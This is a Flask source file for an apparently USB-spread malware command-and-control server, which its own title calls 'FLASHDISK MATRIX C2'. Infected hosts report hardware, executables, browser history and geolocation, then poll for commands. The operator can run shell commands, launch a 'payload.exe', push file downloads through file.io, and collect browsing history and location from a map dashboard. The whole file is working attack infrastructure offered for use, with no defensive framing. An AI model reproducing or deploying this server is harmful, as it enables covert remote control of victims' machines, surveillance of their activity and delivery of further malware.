from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from datetime import datetime
import json
import requests
import os

app = Flask(__name__)

# ----------------------- PENYIMPANAN MEMORI -----------------------
clients = {}      # hostname -> {ip, hardware, executables, location, browser_history, last_seen}
commands = {}     # hostname -> list of command objects
command_counter = 0

# ----------------------- HELPERS -----------------------
def save_command(hostname, cmd_type, cmd_data):
    global command_counter
    command_counter += 1
    if hostname not in commands:
        commands[hostname] = []
    commands[hostname].append({
        'id': command_counter,
        'command_type': cmd_type,
        'command_data': cmd_data,
        'status': 'pending',
        'result': None,
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return command_counter

def get_pending_commands(hostname):
    if hostname not in commands:
        return []
    pending = []
    for cmd in commands[hostname]:
        if cmd['status'] == 'pending':
            pending.append({
                'id': cmd['id'],
                'command_type': cmd['command_type'],
                'command_data': cmd['command_data']
            })
            cmd['status'] = 'sent'   # tanda sudah diambil client
    return pending

def update_command_result(cmd_id, status, result):
    for host in commands:
        for cmd in commands[host]:
            if cmd['id'] == cmd_id:
                cmd['status'] = status
                cmd['result'] = result
                cmd['executed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                return

# ----------------------- UPLOAD FILE KE FILE.IO -----------------------
def upload_to_fileio(file_data, filename):
    """Upload file ke file.io, kembalikan URL download (sekali pakai)"""
    try:
        files = {'file': (filename, file_data)}
        resp = requests.post('https://file.io', files=files)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                return data.get('link')
    except Exception as e:
        print(f"Upload error: {e}")
    return None

# ----------------------- TEMPLATE HTML MATRIX + LEAFLET -----------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>⚡ FLASHDISK MATRIX C2 ⚡</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
            overflow-x: auto;
        }
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(2px);
            border: 1px solid #0f0;
            border-radius: 12px;
            padding: 20px;
        }
        h1, h2, h3 {
            border-left: 3px solid #0f0;
            padding-left: 15px;
            margin: 15px 0;
        }
        .matrix-panel {
            background: #0a0f0a;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        select, input, button, textarea {
            background: #111;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px 10px;
            font-family: monospace;
            border-radius: 4px;
        }
        button:hover {
            background: #0f0;
            color: #000;
            cursor: pointer;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 6px;
            text-align: left;
            vertical-align: top;
        }
        th {
            background: #1a2a1a;
        }
        #map {
            height: 300px;
            border: 1px solid #0f0;
            border-radius: 8px;
        }
        .status-pending { color: #ffcc00; }
        .status-success { color: #0f0; }
        .status-failed { color: #f44; }
        .cmd-history {
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="container">
    <h1>🧬 FLASHDISK MATRIX COMMAND & CONTROL</h1>
    <div class="matrix-panel">
        <label>🔽 PILIH CLIENT : </label>
        <select id="clientSelect" onchange="loadClientData()">
            <option value="">-- Pilih Hostname --</option>
        </select>
        <span style="margin-left:15px;">⚡ Memory Mode (No DB)</span>
    </div>
    <div id="clientInfo" style="display:none;">
        <div class="matrix-panel">
            <h2>🖥️ HARDWARE SPESIFIKASI</h2>
            <div id="hardwareTable"></div>
        </div>
        <div class="matrix-panel">
            <h2>🗺️ LOKASI (IP GEOLOCATION)</h2>
            <div id="map"></div>
            <div id="locDetails"></div>
        </div>
        <div class="matrix-panel">
            <h2>📨 KONTROL PERINTAH</h2>
            <div style="display:flex; flex-wrap:wrap; gap:10px; margin-bottom:15px;">
                <button onclick="sendText()">📝 Kirim Pesan</button>
                <button onclick="sendRunCmd()">⚙️ Jalankan CMD</button>
                <button onclick="sendExecExe()">🎯 Jalankan .exe</button>
                <button onclick="sendDownloadUrl()">📥 Download dari URL</button>
                <button onclick="showUploadForm()">📂 Upload & Kirim File</button>
                <button onclick="sendGetBrowser()">🌐 Ambil Riwayat Browser</button>
                <button onclick="sendGetLocation()">📍 Ambil Lokasi Terbaru</button>
                <button onclick="sendGetSysInfo()">🔧 Ambil Info Sistem</button>
            </div>
            <div id="uploadForm" style="display:none; margin-top:10px;">
                <input type="file" id="fileUpload" accept="*/*">
                <button onclick="uploadAndSend()">Upload & Kirim ke Client</button>
            </div>
            <div id="cmdResult" style="margin-top:10px;"></div>
        </div>
        <div class="matrix-panel">
            <h2>📜 RIWAYAT PERINTAH & HASIL</h2>
            <div id="commandHistory" class="cmd-history"></div>
        </div>
    </div>
</div>
<script>
    let currentHostname = "", map = null, marker = null;

    // Matrix rain animation
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#$%&";
    const fontSize = 16;
    let columns = canvas.width / fontSize;
    let drops = Array(Math.floor(columns)).fill(1);
    function drawMatrix() {
        ctx.fillStyle = "rgba(0,0,0,0.05)";
        ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = "#0f0";
        ctx.font = fontSize+"px monospace";
        for(let i=0;i<drops.length;i++) {
            let text = chars[Math.floor(Math.random()*chars.length)];
            ctx.fillText(text, i*fontSize, drops[i]*fontSize);
            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize',()=>{ canvas.width = window.innerWidth; canvas.height = window.innerHeight; columns = canvas.width/fontSize; drops = Array(Math.floor(columns)).fill(1); });

    // Load daftar client
    async function loadClientList() {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        const select = document.getElementById('clientSelect');
        select.innerHTML = '<option value="">-- Pilih Hostname --</option>';
        clients.forEach(c => {
            const opt = document.createElement('option');
            opt.value = c.hostname;
            opt.textContent = `${c.hostname} (${c.ip}) - last: ${c.last_seen}`;
            select.appendChild(opt);
        });
        if(clients.length && !currentHostname) {
            select.value = clients[0].hostname;
            loadClientData();
        }
    }

    // Load data client (hardware, peta, history)
    async function loadClientData() {
        const hostname = document.getElementById('clientSelect').value;
        if(!hostname) return;
        currentHostname = hostname;
        document.getElementById('clientInfo').style.display = 'block';

        // Hardware
        const hwRes = await fetch(`/api/client/${encodeURIComponent(hostname)}`);
        const client = await hwRes.json();
        if(client.hardware) {
            let html = `§<th>Properti</th><th>Nilai</th></tr>`;
            for(let [k,v] of Object.entries(client.hardware)) {
                let val = (typeof v === 'object') ? JSON.stringify(v, null, 2) : v;
                html += `<tr><td>${k}</td><td><pre>${val}</pre></td></tr>`;
            }
            html += `<\/table>`;
            document.getElementById('hardwareTable').innerHTML = html;
        } else {
            document.getElementById('hardwareTable').innerHTML = '<p>Tidak ada data hardware.</p>';
        }

        // Lokasi & peta
        const locRes = await fetch(`/api/client/location/${encodeURIComponent(hostname)}`);
        const loc = await locRes.json();
        document.getElementById('locDetails').innerHTML = `<span>📍 ${loc.city}, ${loc.region} | 🧭 ${loc.lat}, ${loc.lon}</span>`;
        if(!map) {
            map = L.map('map').setView([loc.lat, loc.lon], 10);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '© OSM & CartoDB'
            }).addTo(map);
        } else {
            map.setView([loc.lat, loc.lon], 10);
            if(marker) map.removeLayer(marker);
        }
        marker = L.marker([loc.lat, loc.lon]).addTo(map);

        // Riwayat perintah
        loadCommandHistory(hostname);
    }

    async function loadCommandHistory(hostname) {
        const res = await fetch(`/api/commands/${encodeURIComponent(hostname)}`);
        const cmds = await res.json();
        let html = `<table><tr><th>ID</th><th>Tipe</th><th>Data</th><th>Status</th><th>Hasil</th><th>Waktu</th></tr>`;
        cmds.forEach(c => {
            let statusClass = '';
            if(c.status === 'pending') statusClass = 'status-pending';
            else if(c.status === 'success') statusClass = 'status-success';
            else if(c.status === 'failed') statusClass = 'status-failed';
            html += `<tr>
                <td>${c.id}</td>
                <td>${c.command_type}</td>
                <td><pre>${c.command_data}</pre></td>
                <td class="${statusClass}">${c.status}</td>
                <td><pre>${c.result || '-'}</pre></td>
                <td>${c.created_at}</td>
            </tr>`;
        });
        html += `<\/table>`;
        document.getElementById('commandHistory').innerHTML = html;
    }

    // Kirim perintah umum
    async function sendCommand(cmdType, cmdData) {
        if(!currentHostname) { alert('Pilih client dulu!'); return; }
        const res = await fetch('/api/send_command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({hostname: currentHostname, command_type: cmdType, command_data: cmdData})
        });
        if(res.ok) {
            const result = await res.json();
            document.getElementById('cmdResult').innerHTML = '✅ Perintah dikirim ke client';
            loadCommandHistory(currentHostname);
            setTimeout(() => document.getElementById('cmdResult').innerHTML = '', 3000);
        } else {
            document.getElementById('cmdResult').innerHTML = '❌ Gagal mengirim perintah';
        }
    }

    function sendText() {
        let msg = prompt('Masukkan pesan teks untuk client:');
        if(msg) sendCommand('text', msg);
    }
    function sendRunCmd() {
        let cmd = prompt('Perintah CMD (contoh: dir /?):');
        if(cmd) sendCommand('run', cmd);
    }
    function sendExecExe() {
        let exe = prompt('Nama file .exe yang ada di flashdisk (contoh: payload.exe):');
        if(exe) sendCommand('exec_exe', exe);
    }
    function sendDownloadUrl() {
        let url = prompt('URL file untuk didownload client:');
        if(url) sendCommand('download', url);
    }
    function showUploadForm() {
        const form = document.getElementById('uploadForm');
        form.style.display = form.style.display === 'none' ? 'block' : 'none';
    }
    async function uploadAndSend() {
        const fileInput = document.getElementById('fileUpload');
        if(!fileInput.files.length) { alert('Pilih file dulu!'); return; }
        const file = fileInput.files[0];
        const formData = new FormData();
        formData.append('file', file);
        const res = await fetch('/api/upload', { method: 'POST', body: formData });
        const data = await res.json();
        if(data.url) {
            sendCommand('download', data.url);
            document.getElementById('uploadForm').style.display = 'none';
            fileInput.value = '';
        } else {
            alert('Upload gagal: ' + (data.error || 'Unknown error'));
        }
    }
    function sendGetBrowser() {
        sendCommand('get_browser_history', '');
    }
    function sendGetLocation() {
        sendCommand('get_location', '');
    }
    function sendGetSysInfo() {
        sendCommand('get_system_info', '');
    }

    // Refresh setiap 15 detik
    setInterval(() => {
        loadClientList();
        if(currentHostname) loadCommandHistory(currentHostname);
    }, 15000);
    loadClientList();
</script>
</body>
</html>
"""

# ----------------------- ROUTES -----------------------
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/clients')
def list_clients():
    return jsonify([{'hostname': h, 'ip': c['ip'], 'last_seen': c['last_seen']} for h, c in clients.items()])

@app.route('/api/client/<hostname>')
def get_client(hostname):
    if hostname in clients:
        return jsonify({'hostname': hostname, 'hardware': clients[hostname].get('hardware', {})})
    return jsonify({'error': 'not found'}), 404

@app.route('/api/client/location/<hostname>')
def client_location(hostname):
    if hostname in clients and 'location' in clients[hostname]:
        loc = clients[hostname]['location']
        return jsonify({'lat': loc.get('lat', -6.2), 'lon': loc.get('lon', 106.8), 'city': loc.get('city', 'Unknown'), 'region': loc.get('region', 'Unknown')})
    # default Jakarta
    return jsonify({'lat': -6.2, 'lon': 106.8, 'city': 'Jakarta', 'region': 'Jakarta'})

@app.route('/api/commands/<hostname>')
def list_commands(hostname):
    cmds = commands.get(hostname, [])
    # kembalikan dalam urutan terbalik (terbaru di atas)
    return jsonify(sorted(cmds, key=lambda x: x['id'], reverse=True))

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    hostname = data.get('hostname')
    cmd_type = data.get('command_type')
    cmd_data = data.get('command_data')
    if not hostname or not cmd_type:
        return jsonify({'message': 'Missing fields'}), 400
    save_command(hostname, cmd_type, cmd_data or '')
    return jsonify({'status': 'ok'}), 200

@app.route('/report', methods=['POST'])
def handle_report():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No JSON"}), 400
        hostname = data.get('hostname')
        ip = data.get('ip')
        hardware = data.get('hardware', {})
        executables = data.get('executables', [])
        location = data.get('location', {})
        browser_history = data.get('browser_history', [])
        clients[hostname] = {
            'ip': ip,
            'hardware': hardware,
            'executables': executables,
            'location': location,
            'browser_history': browser_history,
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        print(f"[REPORT] {hostname} ({ip}) - {len(executables)} exe files")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in /report: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/poll_commands', methods=['POST'])
def poll_commands():
    data = request.get_json()
    hostname = data.get('hostname')
    if not hostname:
        return jsonify([])
    pending = get_pending_commands(hostname)
    return jsonify(pending)

@app.route('/command_result', methods=['POST'])
def command_result():
    data = request.get_json()
    cmd_id = data.get('command_id')
    status = data.get('status')
    result = data.get('result', '')
    if cmd_id:
        update_command_result(cmd_id, status, result)
    return jsonify({"ok": True})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Endpoint untuk upload file ke file.io dan mengembalikan URL download"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'Empty filename'}), 400
    file_data = file.read()
    url = upload_to_fileio(file_data, file.filename)
    if url:
        return jsonify({'url': url})
    else:
        return jsonify({'error': 'Upload failed'}), 500

# Endpoint tambahan untuk update lokasi / browser history dari client (jika dibutuhkan)
@app.route('/update_location', methods=['POST'])
def update_location():
    data = request.json
    hostname = data.get('hostname')
    location = data.get('location')
    if hostname in clients and location:
        clients[hostname]['location'] = location
        clients[hostname]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return jsonify({"ok": True})

@app.route('/update_browser_history', methods=['POST'])
def update_browser_history():
    data = request.json
    hostname = data.get('hostname')
    history = data.get('browser_history', [])
    if hostname in clients:
        clients[hostname]['browser_history'] = history
        clients[hostname]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(debug=True)
